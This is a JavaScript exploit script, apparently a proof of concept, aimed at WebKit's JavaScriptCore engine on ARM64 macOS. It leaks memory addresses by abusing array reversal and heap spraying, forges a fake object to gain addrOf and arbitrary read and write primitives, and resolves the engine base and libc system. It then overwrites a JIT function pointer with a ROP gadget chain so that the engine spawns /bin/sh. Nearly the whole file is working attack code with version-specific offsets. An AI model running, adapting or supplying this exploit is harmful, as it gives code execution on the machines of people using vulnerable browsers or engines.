// DYLD_FRAMEWORK_PATH=/Users/lanleft/Desktop/webkit-masOS/WebKit/WebKitBuild/Release ./WebKit/WebKitBuild/Release/jsc

const hex = (x) => ("0x" + x.toString(16));

var buf = new ArrayBuffer(8);
var f64_buf = new Float64Array(buf);
var u64_buf = new BigUint64Array(buf);

// function change float to integer
function f2i(val) {
	f64_buf[0] = val;
	return u64_buf[0];
}

// change integer to float
function i2f(val) {
	u64_buf[0] = val;
	return f64_buf[0];
}
// leak

let spray_arr = new Array(0x20);

for (let i = 0; i < 0x40; i++) {
    spray_arr[i] = [2.1*i, 2.2, 2.3];
    // print (describe(spray_arr[i]));
}

gc();
// write
b1 = [1.1];
b1 = b1.toReversed();
let addr1 = f2i(b1[1]) + 8n;
print ("address1: " + hex(addr1));
// addr1 = addr1 & 0xffffffn;
//print(describe(b1));

for (let i = 0; i < 0x1f; i++) {
    b1 = [1.1];
    b1 = b1.toReversed();
    // print(hex(f2i(b1[1])));
    if(i == 0)
        sign_addr1 = f2i(b1[1]);
    //print(describe(b1));
}
print("sign_addr1 :" + hex(sign_addr1));
if ((sign_addr1 & 0xffffffn) == 0x07c300n) {
    print("30 Dec commit version");
    fake_obj_ofs = 0x73d70n;
    fake_butterfly_ofs = 0x178178n;
    fake_butterfly_elem0 = fake_butterfly_ofs-8n;
    abr_rw_obj = fake_butterfly_ofs+0x18n;
    rw_idx_arr = 3;
    addrOf_idx_arr = 2;
} else if ((sign_addr1 & 0xffffffn) == 0x07c400n) {
    print("25 Dec commit version");
    fake_obj_ofs = 0x0737d0n;
    fake_butterfly_ofs = 0x073bb8n;
    fake_butterfly_elem0 = 0x073738n;
    abr_rw_obj = fake_butterfly_ofs+0x18n;
    rw_idx_arr = 3;
    addrOf_idx_arr = 2;
} else if ((sign_addr1 & 0xffffffn) == 0x45c300n) {
    print("053d9a8 commit version");
    fake_obj_ofs = 0x539d0n;
    fake_butterfly_ofs = 0x53b38n;
    fake_butterfly_elem0 = 0x53cd8n;
    abr_rw_obj = 0x53b50n;
    rw_idx_arr = 1;
    addrOf_idx_arr = 0;
} else {
    print("unknown commit version");
    exit();
}

print("====================================");
// 0x7fffaa453320+0x10
let addr2 = fake_obj_ofs | (BigInt(sign_addr1) & ~0xFFFFFn);
print("addr2: " +  hex(addr2));
for (let i = 0; i < 0x20; i++) {
    b2 = [1.1*i, i2f(addr2), i2f(addr2)];
    // print(describe(b2));
}
gc();

print("==================step 2==================");
let spray_obj = new Array(0x20);
for (let i = 0; i < 0x20; i++) {
    b4 = [{}];
    spray_obj[i] = b4.toReversed();
    // print(describe(spray_obj[i]));
}

print("==================fake_butterfly_ofs==================");
let butterfly_addr1 = fake_butterfly_ofs | (BigInt(sign_addr1) & ~0xFFFFFn);
print("butterfly_addr1: " + hex(butterfly_addr1));
for (let i = 0; i < 0x20; i++) {
    b2 = [1.1*i, i2f(0x1082409000060f0n), i2f(butterfly_addr1)]; // structure id | butterfly
    // print(describe(b2));

}
print("===================fake_butterfly_elem0=================");

let butterfly_addr2 = fake_butterfly_elem0 | (BigInt(sign_addr1) & ~0xFFFFFn);
let spray_arr_float = new Array(0x10);
for (let i = 0; i < 0x10; i++) {
    spray_arr_float[i] = [2.1*i, i2f(0x133700001337n), i2f(butterfly_addr2)];
    // print(describe(spray_arr_float[i]));
}

print("==================step 3==================");
// print(describe(spray_obj[0x15]));
let target_arr = spray_obj[0x15][1];
let float_arr = spray_arr_float[addrOf_idx_arr]; // 2

// print(describe(target_arr))
// print(describe(float_arr));

function addrOf(obj) {
    float_arr = spray_arr_float[addrOf_idx_arr];
    target_arr = spray_obj[0x15][1];
    target_arr[0] = obj;
    return f2i(float_arr[2]);
}

// let t2 = {};
// print(describe(t2));
// print(hex(addrOf(t2)));
// sleepSeconds(5);


function arb_read(addr){
    float_arr = spray_arr_float[rw_idx_arr];
    target_arr = spray_obj[0x15][1];
    let cnt = -1;
    // print(describe(target_arr));
    // print(describe(float_arr));

    do {
        cnt += 1;
        float_arr[0] = i2f((BigInt(sign_addr1) & ~0xFFFFFn) | abr_rw_obj);
        float_arr[1] = i2f(0x0108240700006160n);
        float_arr[2] = i2f(addr-BigInt(cnt)*8n);
        // print(describe(target_arr[2]));
    } while (f2i(target_arr[2][0+cnt]) == 0x7ff8000000000000n);
    // print(describe(target_arr[2]));
    return f2i(target_arr[2][0+cnt]) ;
}

function arb_write(addr, value){
    // print("addr: " + hex(addr) + " value: " + hex(value));
    float_arr = spray_arr_float[rw_idx_arr];
    target_arr = spray_obj[0x15][1];

    // print(describe(float_arr));
    // print(describe(target_arr));
    // sleepSeconds(5);

    float_arr[0] = i2f((BigInt(sign_addr1) & ~0xFFFFFn) | abr_rw_obj);
    float_arr[1] = i2f(0x0108240700006160n);
    float_arr[2] = i2f(addr);

    // print(describe(target_arr[2]));
    target_arr[2][0] = i2f(value);
    return;
}

print("==================step 4==================");

// print(hex(arb_read(addrOf(target_arr)+8n)));
function makeJITCompiledFunction() {
    var obj = {};
    // Some code to avoid inlining...
    function target(a) {
        a += -6.618150152861756e-229;
        a += 3.0511041903127353e-251;
        a += 3.035759569203399e-251;
        a += -6.827649523728745e-229;
        a += 1.0880585577140108e-306;
        return a;
    }
    // Force JIT compilation.
    for (var i = 0; i < 1000; i++) {
      target(i);
    }
    for (var i = 0; i < 1000; i++) {
      target(i);
    }
    for (var i = 0; i < 1000; i++) {
      target(i);
    }
    return target;
  }

let shellcodeFunc = makeJITCompiledFunction();
shellcodeFunc();
// print(describe(shellcodeFunc));
let addrOf_shellcodeFunc = addrOf(shellcodeFunc);
print("addrOf_shellcodeFunc: " + hex(addrOf_shellcodeFunc)); // jit code addr = *(shellcodeFunc+0x18)+0x18
// sleepSeconds(5);
let addrOf_shellcodeFunc_18h = arb_read(addrOf_shellcodeFunc + 0x18n);
print("addrOf_shellcodeFunc_18h: " + hex(addrOf_shellcodeFunc_18h));
let jit_code = arb_read(addrOf_shellcodeFunc_18h + 0x18n) ;
print( "jit code: " + hex(jit_code) );

print("==================step 5==================");

const JS_FUNCTION_TO_EXECUTABLE = 0x18n;
const EXECUTABLE_TO_NATIVE_FUNC = 0x28n;
const JSC_BASE_TO_MATH_EXP = 0xf6b6f8n;
const X21_OFFSET = 0x10n;
const X21_GAP = 0x00000000000007a0n-0x20n;
const SYSTEM_RANDOM_GAP = 0x67e8cn;

let mathExp = Math.exp;
// print(describe(mathExp));
let funcAddr = addrOf(mathExp);
print("funcAddr: " + hex(funcAddr));
let executableAddr = arb_read(funcAddr + JS_FUNCTION_TO_EXECUTABLE);
print("executableAddr: " + hex(executableAddr));
let mathExpAddr = arb_read(executableAddr + EXECUTABLE_TO_NATIVE_FUNC);
print("mathExpAddr: " + hex(mathExpAddr));
let x21_value = arb_read(executableAddr + X21_OFFSET) + X21_GAP;
print("x21_value: " + hex(x21_value));

const jscBase = mathExpAddr - JSC_BASE_TO_MATH_EXP;
print("jscBase: " + hex(jscBase));
// const pthread_jit_write_protect_np_plt_addr = jscBase + 0x14BA8D4n;
// print("pthread_jit_write_protect_np_plt_addr: " + hex(pthread_jit_write_protect_np_plt_addr));

// reading system_libc
var random_addr = arb_read(jscBase + 0x16110D8n);
print("random_addr: " + hex(random_addr));
var system_addr = random_addr + SYSTEM_RANDOM_GAP;
print("system_addr: " + hex(system_addr));

print("==================ROP==================");

// sleepSeconds(5);
// 0x0000000000b148dc : ldr x0, [x21, #0x10] ; ldr x8, [x0] ; ldr x3, [x8, #0x10] ; mov x1, x20 ; mov x2, x22 ; ldp x29, x30, [sp, #0x30] ; ldp x20, x19, [sp, #0x20] ; ldp x22, x21, [sp, #0x10] ; add sp, sp, #0x40 ; br x3
/*
first gadget:
(lldb) x/10i 0x10306c8dc
->  0x10306c8dc: ldr    x0, [x21, #0x10]
    0x10306c8e0: ldr    x8, [x0]
    0x10306c8e4: ldr    x3, [x8, #0x10]
    0x10306c8e8: mov    x1, x20
    0x10306c8ec: mov    x2, x22
    0x10306c8f0: ldp    x29, x30, [sp, #0x30]
    0x10306c8f4: ldp    x20, x19, [sp, #0x20]
    0x10306c8f8: ldp    x22, x21, [sp, #0x10]
    0x10306c8fc: add    sp, sp, #0x40
    0x10306c900: br     x3

second gadget:
(lldb) x/10i 0x103ec014
->  0x103ec014: ldr    x1, [x8, #0x18]
    0x103ec018: ldr    x0, [x0, #0x58]
    0x103ec01c: br     x1
*/
pop_x3 = jscBase + 0x0000000000b148dcn;
print("pop_x3: " + hex(pop_x3));
// 0x00000000013ec014 : ldr x1, [x8, #0x18] ; ldr x0, [x0, #0x58] ; br x1
pop_x0 = jscBase + 0x00000000013ec014n;
print("pop_x0: " + hex(pop_x0));

var fake_value0 = [
    i2f(0x68732f6e69622fn), // /bin/sh
    i2f(0x4242424242424242n),
    i2f(pop_x0), // system_addr

    i2f(system_addr), 

    0, 0, 0, 0, 0,
    0, // x8
    0, 0, 0, 0,
    0,
]
var fake_value0_butterfly = arb_read(addrOf(fake_value0) + 0x8n);
print("fake_value0_butterfly: " + hex(fake_value0_butterfly));

var fake_value1 = [
    i2f(fake_value0_butterfly), // x0
    i2f(0x4141414141414141n),
    0,

    0,

    0, 0, 0, 0, 0,
    0, // x8
    0, i2f(fake_value0_butterfly), 0, 0,
    0,
]

var fake_value1_butterfly = arb_read(addrOf(fake_value1) + 0x8n);
print("fake_value1_butterfly: " + hex(fake_value1_butterfly));

arb_write(x21_value + 0x10n, fake_value1_butterfly); // ldr    x0, [x21, #0x10]

arb_write(addrOf_shellcodeFunc_18h + 0x18n, pop_x3);
// sleepSeconds(5);
shellcodeFunc();


// sleepSeconds(5);

